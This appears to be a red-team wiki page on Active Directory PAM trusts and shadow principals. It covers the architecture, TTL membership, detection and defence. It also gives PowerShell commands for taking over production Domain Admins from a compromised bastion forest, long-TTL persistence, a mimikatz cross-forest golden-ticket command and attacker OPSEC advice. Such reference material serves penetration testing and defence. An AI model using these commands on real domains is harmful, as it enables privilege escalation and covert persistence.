---
title: PAM trust and Shadow Principals
slug: shadow-principals-pam
aliases: [PAM trust, shadow principals, privileged access management trust, bastion forest]
---

> **TL;DR:** Privileged Access Management (PAM) trust is a special forest trust where a bastion forest manages privileged access to a production forest via "shadow principals" — objects that mirror production groups with time-limited (TTL) membership. Attackers who compromise the bastion forest gain full control over production, and the TTL mechanism itself can be abused for stealthy persistence.

## Architecture

```
┌─────────────────┐     PAM Trust      ┌──────────────────┐
│  Bastion Forest  │ ──────────────────→│ Production Forest│
│  (admin forest)  │   SIDHistory-based │  (corp.local)    │
│  (priv.local)    │   access           │                  │
└─────────────────┘                     └──────────────────┘
```

**PAM trust characteristics:**
- One-way trust: bastion trusts production (bastion can access production)
- Uses SID filtering relaxation — SIDHistory is honoured across the trust
- Shadow principals in the bastion forest have the SID of production groups in their `member` attribute's SIDHistory
- Requires Windows Server 2016+ forest functional level (both forests)

## Shadow principals explained

A shadow principal is an object in `CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion`:

```powershell
# Query shadow principals in the bastion forest
Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=priv,DC=local" `
    -Filter {objectClass -eq "msDS-ShadowPrincipal"} `
    -Properties "msDS-ShadowPrincipalSid", "member", "msDS-MembershipExpirationTime"
```

Each shadow principal:
- Has `msDS-ShadowPrincipalSid` = SID of the production group (e.g., `Domain Admins` SID from `corp.local`)
- Has `member` = users from the bastion forest who are granted that access
- Has optional `msDS-MembershipExpirationTime` = TTL for time-limited membership

When a bastion user authenticates to production resources, their Kerberos ticket includes the production group SID via SIDHistory, granting access as if they were a member of that production group.

## TTL group membership

The key feature: membership can be **time-limited** (introduced with PAM):

```powershell
# Add a user to a shadow principal with 1-hour TTL
Set-ADObject "CN=ProdDomainAdmins,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=priv,DC=local" `
    -Add @{
        "member" = "<GUID=user-guid>;TTL=3600"
    }

# Check expiration
Get-ADObject "CN=ProdDomainAdmins,CN=Shadow Principal Configuration,..." `
    -Properties "msDS-MembershipExpirationTime"

# Bastion-side: use Microsoft Identity Manager (MIM) portal for JIT requests
# MIM automates the TTL add/remove cycle
```

After TTL expires, the membership is automatically removed — no admin action needed.

## Attack scenarios

### 1. Bastion forest compromise = production forest compromise

If an attacker gains DA in the bastion forest:

```powershell
# Create a new shadow principal for production Domain Admins
New-ADObject -Type "msDS-ShadowPrincipal" `
    -Name "ShadowDA" `
    -Path "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=priv,DC=local" `
    -OtherAttributes @{
        "msDS-ShadowPrincipalSid" = (Get-ADGroup "Domain Admins" -Server corp.local).SID.Value
    }

# Add attacker-controlled bastion user as member
Set-ADObject "CN=ShadowDA,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=priv,DC=local" `
    -Add @{ "member" = "CN=attacker,CN=Users,DC=priv,DC=local" }

# Now authenticate to production as Domain Admin
Enter-PSSession -ComputerName prod-dc.corp.local -Credential priv\attacker
```

### 2. TTL abuse for stealthy persistence

```powershell
# Set a very long TTL (30 days) — avoids permanent membership detection
Set-ADObject "CN=ProdDomainAdmins,..." `
    -Add @{ "member" = "<GUID=attacker-guid>;TTL=2592000" }

# Or: create a shadow principal for a less-monitored production group
# (e.g., Server Operators, Backup Operators) to avoid DA monitoring
```

### 3. Modifying existing shadow principal membership

```powershell
# If MIM service account is compromised, request JIT elevation through the
# legitimate workflow — appears as normal PAM activity
# The request passes through MIM approval workflows (if configured)
```

### 4. SIDHistory injection without PAM

Even without PAM trust, if you control the bastion forest's `krbtgt`, forge tickets with production SIDs:

```
# Golden ticket with cross-forest SID
mimikatz # kerberos::golden /user:admin /domain:priv.local \
    /sid:S-1-5-21-bastion... /krbtgt:hash \
    /sids:S-1-5-21-production...-512 /ptt
```

This works because the PAM trust relaxes SID filtering. See [[cross-forest-trust-abuse]] and [[sidhistory-injection]].

## Enumeration from production side

If you're in the production forest and want to check if PAM trust exists:

```powershell
# Check for PAM trust
Get-ADTrust -Filter {ForestTransitive -eq $true} |
    Where-Object { $_.TrustAttributes -band 0x400 }
# TrustAttribute 0x400 = TRUST_ATTRIBUTE_PIM_TRUST (PAM trust)

# Alternative: check trust flags
nltest /domain_trusts /all_trusts
# Look for "PAM" or "PIM" flag in trust attributes

# Enumerate shadow principals (requires bastion forest access)
# From production, you can see the trust but not the shadow principal objects
```

## Detection and defence

- **Monitor shadow principal changes** — audit `CN=Shadow Principal Configuration` for object creation/modification
- **Event ID 4769** with cross-forest ticket requests from bastion — correlate with approved JIT requests
- **MIM audit logs** — all JIT elevation requests should go through MIM; direct LDAP modifications to shadow principals indicate abuse
- **TTL anomalies** — alert on TTL values significantly longer than organisational policy (e.g., >4 hours)
- **Bastion forest hardening** — the bastion forest is the crown jewel; apply tiered admin, PAW stations, and zero standing privileges
- **SID filtering exceptions** — regularly audit which SIDs are allowed across the PAM trust

```powershell
# Monitor shadow principal modification events
# Event ID 5136 (Directory Service Changes) on the bastion DC
# Filter for targetDN containing "Shadow Principal Configuration"
```

## OPSEC pitfalls

- Shadow principal creation is logged — direct LDAP manipulation bypasses MIM but not AD audit logs
- PAM trust is uncommon; if the target has one, the security team is likely sophisticated
- TTL membership still appears in Kerberos tickets for the duration — PAC inspection reveals the SIDHistory
- Bastion forests typically have extreme monitoring — expect MDI, heavy Sysmon, and restricted admin paths

## References

- [Microsoft — PAM for AD DS](https://learn.microsoft.com/en-us/microsoft-identity-manager/pam/privileged-identity-management-for-active-directory-domain-services)
- [Microsoft — MIM PAM deployment](https://learn.microsoft.com/en-us/microsoft-identity-manager/pam/deploy-pam-with-windows-server-2016)
- [Harmj0y — Shadow Principals research](https://blog.harmj0y.net/)
- [Dirk-jan Mollema — Forest trust abuse](https://dirkjanm.io/)

See also: [[cross-forest-trust-abuse]], [[sidhistory-injection]], [[golden-tickets]], [[kerberos]], [[ad-persistence]], [[adminsdholder-abuse]], [[child-to-forest-root]]
